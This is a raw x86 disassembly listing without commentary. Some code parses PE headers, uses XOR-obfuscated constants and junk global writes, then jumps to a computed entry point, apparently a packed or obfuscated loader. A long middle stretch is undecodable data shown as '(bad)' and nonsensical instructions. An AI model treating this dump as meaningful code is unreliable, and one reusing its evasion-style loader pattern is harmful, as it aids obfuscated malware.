  40f91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f91d:	push   ds
  40f91e:	push   esi
  40f91f:	cmp    esi,DWORD PTR [ebp+0x6b]
  40f922:	adc    eax,0x39043e82
  40f927:	and    DWORD PTR ds:0x43362b,0x4335a7
  40f931:	xor    al,0x45
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43355f
  40f947:	add    DWORD PTR ds:0x433547,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43362f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433617,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4335a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433663
  40f97f:	adc    ecx,DWORD PTR ds:0x4335ab
  40f985:	mov    DWORD PTR ds:0x433663,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4335b3,0x4335af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433623,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433597,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4335db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433547,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43365f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4335e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433633,0x4335a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43361b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4335af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43361b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4335a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43355f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43355f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43355f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	in     eax,dx
  40fae1:	sbb    dl,BYTE PTR [bx+si+0x3d]
  40fae5:	mov    bl,0x7c
  40fae7:	jl     0x40fa97
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40faed
  40faed:	mov    ecx,0xef8d5cbd
  40faf2:	aam    0x4d
  40faf4:	or     edi,DWORD PTR [eax+eax*2+0x6e45e74]
  40fafb:	je     0x40fb26
  40fafd:	and    DWORD PTR ds:0xfc742c02,esp
  40fb03:	cmp    DWORD PTR [ebx+0x41],edi
  40fb06:	test   al,0x2d
  40fb08:	sahf   
  40fb09:	cmp    ch,BYTE PTR [ecx-0x37]
  40fb0c:	pushf  
  40fb0d:	ss cli 
  40fb0f:	pop    ecx
  40fb10:	fistp  DWORD PTR [eax]
  40fb12:	and    eax,ebp
  40fb14:	das    
  40fb15:	(bad)  
  40fb16:	lea    esp,[edi-0x2f]
  40fb19:	sbb    DWORD PTR [ebp-0x7c],edi
  40fb1c:	mov    edi,0x7b7f89ee
  40fb21:	fs call 0xd12b4d27
  40fb27:	sbb    al,0x21
  40fb29:	mov    eax,0xd13655f3
  40fb2e:	fsubr  QWORD PTR [eax+0x4f]
  40fb31:	mov    dh,0xe1
  40fb33:	jmp    0x9e36:0x3285fdd6
  40fb3a:	je     0x40fb4b
  40fb3c:	sar    DWORD PTR [ebx+0x224f84c6],1
  40fb42:	inc    edx
  40fb43:	mov    eax,0xd2f083ec
  40fb48:	xchg   ebx,esp
  40fb4a:	jns    0x40fb63
  40fb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb4d:	or     DWORD PTR [esi-0x15498ea0],esp
  40fb53:	les    ebp,FWORD PTR [ebx]
  40fb55:	fwait
  40fb56:	adc    bh,al
  40fb58:	mov    ds:0x74b625cc,al
  40fb5d:	aas    
  40fb5e:	aaa    
  40fb5f:	std    
  40fb60:	add    bl,BYTE PTR [ebp+0x4dd69b3c]
  40fb66:	pop    edi
  40fb67:	scas   al,BYTE PTR es:[edi]
  40fb68:	in     al,dx
  40fb69:	frstor ds:0xd416e80
  40fb6f:	push   ds
  40fb70:	xor    BYTE PTR [eax],ch
  40fb72:	cs popf 
  40fb74:	stos   BYTE PTR es:[edi],al
  40fb75:	cmp    eax,DWORD PTR [edi+0x57]
  40fb78:	jo     0x40fb6c
  40fb7a:	cli    
  40fb7b:	pop    esp
  40fb7c:	jns    0x40fb26
  40fb7e:	sbb    ebx,ecx
  40fb80:	push   esi
  40fb81:	icebp  
  40fb82:	jne    0x40fbb5
  40fb84:	(bad)  
  40fb85:	loopne 0x40fb9d
  40fb87:	or     BYTE PTR [eax+0x1f923ad8],ch
  40fb8d:	scas   al,BYTE PTR es:[edi]
  40fb8e:	dec    edi
  40fb8f:	and    BYTE PTR [edi+ebx*4-0x1d],ah
  40fb93:	cmp    BYTE PTR [ebp-0x1fac70a8],dh
  40fb99:	fdiv   st(0),st
  40fb9b:	push   0xbf217fb5
  40fba0:	xchg   edi,eax
  40fba1:	test   BYTE PTR [eax+0x48],dl
  40fba4:	jb     0x40fc18
  40fba6:	and    al,BYTE PTR [edx-0x1b98818b]
  40fbac:	push   edx
  40fbad:	sbb    BYTE PTR [ebx+0x49],bh
  40fbb0:	sub    eax,0xda7cc48e
  40fbb5:	add    eax,0x619ba817
  40fbba:	jnp    0x40fbae
  40fbbc:	in     eax,dx
  40fbbd:	jp     0x40fbc3
  40fbbf:	call   0x1f2f1eda
  40fbc4:	pop    ecx
  40fbc5:	mov    ah,0x90
  40fbc7:	push   esp
  40fbc8:	add    esi,0x972f2f2f
  40fbce:	add    eax,0xd5f46c4f
  40fbd3:	or     edx,DWORD PTR [edx-0x593cd7ea]
  40fbd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbda:	popa   
  40fbdb:	rcl    BYTE PTR [edi-0x3e],1
  40fbde:	lock fcmovnbe st,st(4)
  40fbe1:	inc    ebx
  40fbe2:	out    0x8a,eax
  40fbe4:	xor    bl,bh
  40fbe6:	jmp    0x40fc30
  40fbe8:	outs   dx,BYTE PTR ds:[esi]
  40fbe9:	lods   eax,DWORD PTR ds:[esi]
  40fbea:	add    eax,0xef42a120
  40fbef:	push   edi
  40fbf0:	lock (bad) 
  40fbf2:	and    bh,BYTE PTR [ebx]
  40fbf4:	xor    dh,BYTE PTR [esi]
  40fbf6:	(bad)  
  40fbf7:	pop    edx
  40fbf8:	or     BYTE PTR [edx-0x75848c2a],dh
  40fbfe:	inc    eax
  40fbff:	setno  BYTE PTR [ebp+0xa]
  40fc03:	xor    al,0x86
  40fc05:	inc    esp
  40fc06:	mov    ebp,0xc1fb23c4
  40fc0b:	nop
  40fc0c:	test   cl,0x40
  40fc0f:	pop    edx
  40fc10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc11:	adc    DWORD PTR [esi],0x41
  40fc14:	loopne 0x40fb9a
  40fc16:	or     cl,BYTE PTR [ebp+0xf]
  40fc19:	jl     0x40fbc5
  40fc1b:	or     DWORD PTR [edx+0x7e],0x57c58857
  40fc22:	imul   eax,DWORD PTR [esi+0x548cb917],0x3eb3793b
  40fc2c:	add    BYTE PTR [ebx],0x2a
  40fc2f:	pushf  
  40fc30:	clc    
  40fc31:	sub    BYTE PTR [ecx+0x2e],ch
  40fc34:	cs je  0x40fbf7
  40fc37:	jns    0x40fbe9
  40fc39:	iret   
  40fc3a:	jge    0x40fc2b
  40fc3c:	jge    0x40fc4a
  40fc3e:	shr    DWORD PTR [ecx+edi*1],0xd2
  40fc42:	push   ebp
  40fc43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc44:	inc    edi
  40fc45:	mov    bh,0xe3
  40fc47:	into   
  40fc48:	pop    es
  40fc49:	ror    BYTE PTR [edx+edi*8+0x1afb0faf],1
  40fc50:	scas   eax,DWORD PTR es:[edi]
  40fc51:	xchg   ebx,eax
  40fc52:	push   ds
  40fc53:	idiv   DWORD PTR [edi-0x53dc7d4e]
  40fc59:	sbb    DWORD PTR [edx+ebp*4],edi
  40fc5c:	jbe    0x40fc19
  40fc5e:	and    eax,0xacef638d
  40fc63:	loopne 0x40fcc4
  40fc65:	sbb    bh,BYTE PTR [ecx]
  40fc67:	out    dx,eax
  40fc68:	repz jg 0x40fc23
  40fc6b:	dec    ebp
  40fc6c:	retf   0xf124
  40fc6f:	mov    bh,0x88
  40fc71:	(bad)  
  40fc72:	jmp    0x40fc08
  40fc74:	xchg   BYTE PTR [ebx+0x56],cl
  40fc77:	jg     0x40fcdb
  40fc79:	fisubr WORD PTR [esp+esi*4+0x3d6dfbb7]
  40fc80:	mov    esp,0xe18e7bf0
  40fc85:	fadd   DWORD PTR [esi-0x2b]
  40fc88:	jno    0x40fd02
  40fc8a:	fwait
  40fc8b:	push   ds
  40fc8c:	dec    edx
  40fc8d:	imul   ebp,esp,0x7b36cd9a
  40fc93:	cwde   
  40fc94:	push   ecx
  40fc95:	and    DWORD PTR ds:0xbdffb673,ebx
  40fc9b:	and    dh,cl
  40fc9d:	mov    bl,0xe2
  40fc9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fca0:	pop    edx
  40fca1:	loop   0x40fc3c
  40fca3:	xchg   esi,edx
  40fca5:	push   ebx
  40fca6:	jae    0x40fc77
  40fca8:	push   edx
  40fca9:	push   ss
  40fcaa:	push   ebp
  40fcab:	mov    DWORD PTR [ebp+0x31],0x9a28c979
  40fcb2:	out    dx,al
  40fcb3:	sar    DWORD PTR [ebp+0x2fd38ed0],1
  40fcb9:	es sbb al,0xe2
  40fcbc:	lods   eax,DWORD PTR ds:[esi]
  40fcbd:	gs push esp
  40fcbf:	inc    edi
  40fcc0:	mov    ch,0x5d
  40fcc2:	inc    ebx
  40fcc3:	movd   mm0,DWORD PTR [edi-0x4c2e0e95]
  40fcca:	sar    ch,1
  40fccc:	lahf   
  40fccd:	enter  0xf4cc,0xbe
  40fcd1:	add    BYTE PTR [ebp+eiz*8+0xa],dl
  40fcd5:	cdq    
  40fcd6:	mov    cl,0xc2
  40fcd8:	cmp    dl,al
  40fcda:	pop    esp
  40fcdb:	jmp    0x40fd32
  40fcdd:	add    cl,ah
  40fcdf:	jge    0x40fcea
  40fce1:	mov    ch,0xc7
  40fce3:	pop    ecx
  40fce4:	mov    ds:0x69382e6f,al
  40fce9:	and    al,0xa2
  40fceb:	out    dx,al
  40fcec:	popf   
  40fced:	pusha  
  40fcee:	std    
  40fcef:	pop    ebx
  40fcf0:	add    edi,DWORD PTR [edx+0x57f85dd1]
  40fcf6:	pop    edi
  40fcf7:	adc    al,0xbb
  40fcf9:	iret   
  40fcfa:	out    dx,eax
  40fcfb:	xlat   BYTE PTR ds:[ebx]
  40fcfc:	pop    ebx
  40fcfd:	or     ecx,DWORD PTR [esi+edx*4]
  40fd00:	retf   
  40fd01:	push   ecx
  40fd02:	int    0xee
  40fd04:	and    al,0xc9
  40fd06:	and    BYTE PTR [esi+0x5ea0905],ch
  40fd0c:	pop    esp
  40fd0d:	cmp    DWORD PTR [ebx],ecx
  40fd0f:	add    BYTE PTR [ecx],bh
  40fd11:	jns    0x40fc9b
  40fd13:	xchg   ebx,eax
  40fd14:	out    0xdd,eax
  40fd16:	pop    esi
  40fd17:	pop    edi
  40fd18:	inc    esp
  40fd19:	add    cl,BYTE PTR [ebx]
  40fd1b:	push   eax
  40fd1c:	pop    edx
  40fd1d:	sub    cl,ah
  40fd1f:	add    DWORD PTR [ecx+0x3011fb66],eax
  40fd25:	dec    eax
  40fd26:	cli    
  40fd27:	add    edx,DWORD PTR [ebp+ebp*2+0x120c0cc7]
  40fd2e:	mov    bh,0xf
  40fd30:	ret    
  40fd31:	sahf   
  40fd32:	pop    eax
  40fd33:	mov    ebx,0xb9eb8c50
  40fd38:	outs   dx,WORD PTR ds:[esi]
  40fd3a:	mov    esi,0xa2786583
  40fd3f:	les    esp,FWORD PTR [edi-0x47fdc651]
  40fd45:	mov    edi,0x21cd5245
  40fd4a:	jns    0x40fd1d
  40fd4c:	mov    dh,0xdc
  40fd4e:	pop    ds
  40fd4f:	xor    dl,BYTE PTR [ebp+0x56021f91]
  40fd55:	test   eax,0x7d0172fe
  40fd5a:	push   esp
  40fd5b:	add    edi,DWORD PTR [edx+0x41fc3df2]
  40fd61:	sahf   
  40fd62:	xor    BYTE PTR [edx],cl
  40fd64:	iret   
  40fd65:	dec    edi
  40fd66:	push   0xb137c5f
  40fd6b:	cmp    eax,0x3709d2a1
  40fd70:	in     eax,0xe5
  40fd72:	int3   
  40fd73:	jmp    0x17d0:0xe6b50157
  40fd7a:	push   es
  40fd7b:	or     ebx,DWORD PTR [esi+0x4bfbee42]
  40fd81:	dec    esp
  40fd82:	sbb    esi,DWORD PTR [ebx]
  40fd84:	pop    ebx
  40fd85:	jo     0x40fd46
  40fd87:	cmp    BYTE PTR [ebx-0x24],bh
  40fd8a:	mov    ebx,0xc9cf62df
  40fd8f:	mov    BYTE PTR [eax-0x79f7ed29],dh
  40fd95:	repnz cmp al,0xc6
  40fd98:	repz pop ds
  40fd9a:	pop    edi
  40fd9b:	sar    DWORD PTR [ebx+0x11088bc2],cl
  40fda1:	adc    eax,0x43355f
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	push   edx
  40fdc7:	xchg   BYTE PTR [edi+0x7cbd6f23],bl
  40fdcd:	jl     0x40fd7d
  40fdcf:	jle    0x40fe4d
  40fdd1:	jl     0x40fd67
  40fdd3:	mov    ebp,0x5293b086
  40fdd8:	aam    0xc
  40fdda:	ja     0x40fd90
  40fddc:	mov    ah,0x31
  40fdde:	mov    ebx,0x391f1bd8
  40fde3:	(bad)  
  40fde4:	(bad)  
  40fde5:	in     eax,0xf6
  40fde7:	push   ss
  40fde8:	mov    BYTE PTR [eax-0x30945a7f],ah
  40fdee:	adc    DWORD PTR [edi],0xffffff91
  40fdf1:	retf   0x979f
  40fdf4:	dec    ecx
  40fdf5:	daa    
  40fdf6:	or     bl,BYTE PTR [esi]
  40fdf8:	daa    
  40fdf9:	dec    edi
  40fdfa:	repnz push edi
  40fdfc:	sub    al,BYTE PTR [edi-0x1fcd6cf0]
  40fe02:	je     0x40fe57
  40fe04:	(bad)  
  40fe05:	test   al,0xa8
  40fe07:	inc    ebx
  40fe08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe0a:	cmp    dl,BYTE PTR ds:0x3cfe6175
  40fe10:	jo     0x40fe52
  40fe12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe13:	sahf   
  40fe14:	(bad)  
  40fe15:	adc    dl,BYTE PTR [edx+edi*8+0x368f259c]
  40fe1c:	int3   
  40fe1d:	inc    ebx
  40fe1e:	xor    ch,BYTE PTR [edi-0x1501403f]
  40fe24:	int3   
  40fe25:	jns    0x40fdfb
  40fe27:	(bad)  
  40fe28:	jmp    0xc97c:0xfb720933
  40fe2f:	mov    edx,DWORD PTR [edx]
  40fe31:	jns    0x40fe33
  40fe33:	in     eax,dx
  40fe34:	inc    ebx
  40fe35:	cmc    
  40fe36:	ss cwde 
  40fe38:	add    BYTE PTR ds:0xed8b2694,dl
  40fe3e:	or     BYTE PTR [ecx],bh
  40fe40:	push   ss
  40fe41:	mov    cl,ah
  40fe43:	xchg   ecx,eax
  40fe44:	or     bl,BYTE PTR [ecx-0x6b]
  40fe47:	fidivr DWORD PTR [esi+ebx*2+0x6b]
  40fe4b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40fe4d:	sbb    al,0xab
  40fe4f:	retf   0x6c
  40fe52:	jnp    0x40fe30
  40fe54:	fcom   QWORD PTR [esi]
  40fe56:	push   0xa880664
  40fe5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe5c:	call   0x281:0x97450a77
  40fe63:	add    ebx,DWORD PTR [esi]
  40fe65:	push   DWORD PTR [edx+ecx*2]
  40fe68:	adc    bl,BYTE PTR [esi]
  40fe6a:	out    0x86,al
  40fe6c:	mov    DWORD PTR [edi],edi
  40fe6e:	pop    edx
  40fe6f:	pop    eax
  40fe70:	das    
  40fe71:	inc    edx
  40fe72:	shr    bl,0x39
  40fe75:	sar    BYTE PTR [edi-0xa],1
  40fe78:	sbb    BYTE PTR [ebx-0x3c],0x8c
  40fe7c:	jae    0x40fed9
  40fe7e:	rol    bl,1
  40fe80:	daa    
  40fe81:	int3   
  40fe82:	out    0x9e,al
  40fe84:	mov    al,0x55
  40fe86:	adc    ah,bl
  40fe88:	inc    eax
  40fe89:	(bad)  
  40fe8a:	xchg   esi,eax
  40fe8b:	mov    al,ds:0x421aaa95
  40fe90:	add    ebx,DWORD PTR [edi+0x34]
  40fe93:	mov    esi,0x6039c0b2
  40fe98:	ja     0x40fe91
  40fe9a:	outs   dx,BYTE PTR ds:[esi]
  40fe9b:	sbb    DWORD PTR [eax],ebx
  40fe9d:	mov    eax,ds:0x40a81aef
  40fea2:	mov    bl,0x83
  40fea4:	xchg   esi,eax
  40fea5:	cdq    
  40fea6:	sbb    BYTE PTR [ecx+0x4f],dh
  40fea9:	sub    al,0x50
  40feab:	or     al,0x31
  40fead:	das    
  40feae:	call   0x2959:0xf9ff992
  40feb5:	dec    ecx
  40feb6:	inc    ecx
  40feb7:	mov    esp,0xa5334792
  40febc:	hlt    
  40febd:	fwait
  40febe:	xor    al,0xec
  40fec0:	ss jmp 0xe0c9:0x6d8e0fc0
  40fec8:	adc    edi,DWORD PTR [eax-0x40f304f8]
  40fece:	pop    eax
  40fecf:	mov    al,ds:0x55d840e0
  40fed4:	repz dec eax
  40fed6:	stos   BYTE PTR es:[edi],al
  40fed7:	nop
  40fed8:	inc    ecx
  40fed9:	push   0x3c
  40fedb:	mov    dl,BYTE PTR [eax+0x15d7b94d]
  40fee1:	pop    ebp
  40fee2:	nop
  40fee3:	ficom  DWORD PTR [eax-0x6]
  40fee6:	out    0x39,eax
  40fee8:	ret    
  40fee9:	jno    0x40fea6
  40feeb:	(bad)  
  40feec:	(bad)  
  40feed:	adc    DWORD PTR [ebp-0x65],esi
  40fef0:	mov    ecx,0xc0f4a2c3
  40fef5:	push   es
  40fef6:	ss jle 0x40ff44
  40fef9:	out    dx,eax
  40fefa:	in     eax,0x95
  40fefc:	mov    bh,ch
  40fefe:	scas   al,BYTE PTR es:[edi]
  40feff:	mov    ebx,0x1901e8f0
  40ff04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff05:	adc    eax,0x5bbef561
  40ff0a:	push   ds
  40ff0b:	mov    ds:0x66430f88,eax
  40ff10:	outs   dx,BYTE PTR ds:[esi]
  40ff11:	or     BYTE PTR [ebp-0x1ddd3f5],al
  40ff17:	shl    DWORD PTR [eax],0xdb
  40ff1a:	adc    al,0x26
  40ff1c:	adc    al,0xc8
  40ff1e:	nop
  40ff1f:	sub    eax,0x3924bec3
  40ff24:	sbb    DWORD PTR [ecx+0x7c],esp
  40ff27:	xor    dl,BYTE PTR [ecx+0x17]
  40ff2a:	ins    DWORD PTR es:[edi],dx
  40ff2b:	push   edi
  40ff2c:	mov    dl,0x6e
  40ff2e:	or     BYTE PTR [edi],bl
  40ff30:	xor    BYTE PTR [eax-0x48521fdb],ch
  40ff36:	push   ds
  40ff37:	pop    ebx
  40ff38:	jle    0x40ff34
  40ff3a:	inc    edx
  40ff3b:	dec    edx
  40ff3c:	in     al,0x0
  40ff3e:	mov    ch,0x9b
  40ff40:	(bad)  
  40ff41:	rcl    DWORD PTR [ebp+0x5a],1
  40ff44:	sub    esp,DWORD PTR [esi+ebp*2+0x19]
  40ff48:	stos   BYTE PTR es:[edi],al
  40ff49:	or     dh,BYTE PTR [esi+0x55dbb53f]
  40ff4f:	cdq    
  40ff50:	das    
  40ff51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff52:	push   cs
  40ff53:	enter  0x5174,0x96
  40ff57:	mov    cl,0xbf
  40ff59:	jl     0x40ff93
  40ff5b:	mov    ebx,ds
  40ff5d:	(bad)  
  40ff5e:	fsubr  DWORD PTR [ebx-0x10]
  40ff61:	dec    eax
  40ff62:	sbb    al,ah
  40ff64:	push   ds
  40ff65:	mov    ch,0xcc
  40ff67:	jmp    0x40ffe5
  40ff69:	pusha  
  40ff6a:	push   es
  40ff6b:	hlt    
  40ff6c:	mov    WORD PTR [edi+0x4e],fs
  40ff6f:	inc    edx
  40ff70:	jmp    0x160b:0x3101951d
  40ff77:	and    edx,esi
  40ff79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff7a:	cmp    dl,al
  40ff7c:	loopne 0x40ffd1
  40ff7e:	adc    DWORD PTR [esi+ecx*4+0x4a64dab3],edi
  40ff85:	mov    esp,0xc8fe9956
  40ff8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff8b:	(bad)  
  40ff8d:	ror    dl,1
  40ff8f:	mov    bh,0x28
  40ff91:	inc    edi
  40ff92:	hlt    
  40ff93:	ss jno 0x40ff3b
  40ff96:	cdq    
  40ff97:	cwde   
  40ff98:	push   0x47
  40ff9a:	cld    
  40ff9b:	lds    edx,FWORD PTR [edi+0x6f]
  40ff9e:	test   DWORD PTR [ebp+0x550b6a7d],edx
  40ffa4:	aaa    
  40ffa5:	inc    esi
  40ffa6:	pop    edx
  40ffa7:	sbb    edi,0xffffffdf
  40ffaa:	ss sahf 
  40ffac:	sbb    cl,bl
  40ffae:	aas    
  40ffaf:	fiadd  DWORD PTR cs:[ebx+0x25562991]
  40ffb6:	ret    0xd3d6
  40ffb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffba:	push   es
  40ffbb:	lahf   
  40ffbc:	xchg   eax,ebx
  40ffbe:	or     DWORD PTR [ebp-0x163d6e40],ecx
  40ffc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc5:	sub    DWORD PTR [ecx+0x5f],ebx
  40ffc8:	shl    bl,0xe5
  40ffcb:	sbb    eax,0xfe8428d4
  40ffd0:	jno    0x410018
  40ffd2:	adc    BYTE PTR [esi],0x7e
  40ffd5:	arpl   WORD PTR [ebx],di
  40ffd7:	in     eax,0xac
  40ffd9:	pop    esi
  40ffda:	mov    bl,0xab
  40ffdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffdd:	inc    esi
  40ffde:	ret    
  40ffdf:	xchg   esp,eax
  40ffe0:	or     esi,edi
  40ffe2:	dec    ebx
  40ffe3:	jmp    0x41003b
  40ffe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffe6:	repnz arpl si,bx
  40ffe9:	adc    al,0x3a
  40ffeb:	fcmovnbe st,st(5)
  40ffed:	lea    ebx,[ecx+0x39a645d5]
  40fff3:	arpl   dx,cx
  40fff5:	dec    esp
  40fff6:	int3   
  40fff7:	in     al,dx
  40fff8:	in     al,dx
  40fff9:	inc    edi
  40fffa:	fistp  WORD PTR [ebx+0x8]
  40fffd:	fiadd  WORD PTR [esi-0x2a516a18]
  410003:	sbb    BYTE PTR [ebx+0x7f],ah
  410006:	fsubr  QWORD PTR [eax+0x7576dbb4]
  41000c:	mov    cl,0x80
  41000e:	les    eax,FWORD PTR [esi+eiz*2+0x40af1e7]
  410015:	push   ebp
  410016:	sub    BYTE PTR [eax-0x6811212],ah
  41001c:	jge    0x40ffc9
  41001e:	aaa    
  41001f:	int3   
  410020:	mov    eax,0x839a3d58
  410025:	pop    esi
  410026:	dec    ebx
  410027:	scas   eax,DWORD PTR es:[edi]
  410028:	aam    0xd8
  41002a:	out    dx,al
  41002b:	cmp    ah,BYTE PTR [esi]
  41002d:	adc    edi,ebx
  41002f:	popf   
  410030:	loopne 0x410008
  410032:	jecxz  0x40ffd6
  410034:	dec    edx
  410035:	ja     0x410016
  410037:	in     eax,0x6e
  410039:	add    bl,dh
  41003b:	arpl   sp,cx
  41003d:	daa    
  41003e:	or     ebx,esp
  410040:	cmp    DWORD PTR [edx],eax
  410042:	xor    edi,DWORD PTR [esi-0x5e]
  410045:	popa   
  410046:	xchg   BYTE PTR [eax+0x3f],ch
  410049:	lods   al,BYTE PTR ds:[esi]
  41004a:	hlt    
  41004b:	sbb    BYTE PTR [eax],0xa5
  41004e:	arpl   WORD PTR [esi+ebp*8+0x13],bx
  410052:	inc    ecx
  410053:	repnz mov al,ds:0x7d9f397d
  410059:	xchg   edi,eax
  41005a:	or     ch,BYTE PTR [ecx]
  41005c:	sbb    eax,0xca88c706
  410061:	cli    
  410062:	or     ebp,DWORD PTR [edx-0x40]
  410065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410066:	or     ebx,DWORD PTR [edi+0x56]
  410069:	xchg   esp,eax
  41006a:	inc    ecx
  41006b:	adc    BYTE PTR ss:[edi-0x61424726],bl
  410072:	push   ebx
  410073:	mov    bl,0xe
  410075:	retf   
  410076:	jmp    0x55ddcfd3
  41007b:	xchg   BYTE PTR [edi-0x342715ae],dl
  410081:	push   0x458b4c26
  410086:	adc    BYTE PTR [esi-0x7b],bl
  410089:	ror    BYTE PTR [edi],0x84
  41008c:	push   ds
  41008d:	add    BYTE PTR [eax],al
  41008f:	add    bh,bh
  410091:	xor    eax,0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4335df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4335df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4335df,eax
  4100dc:	cmp    DWORD PTR ds:0x4335df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4335df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4335df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4335df
  410111:	inc    eax
  410112:	mov    ds:0x4335df,eax
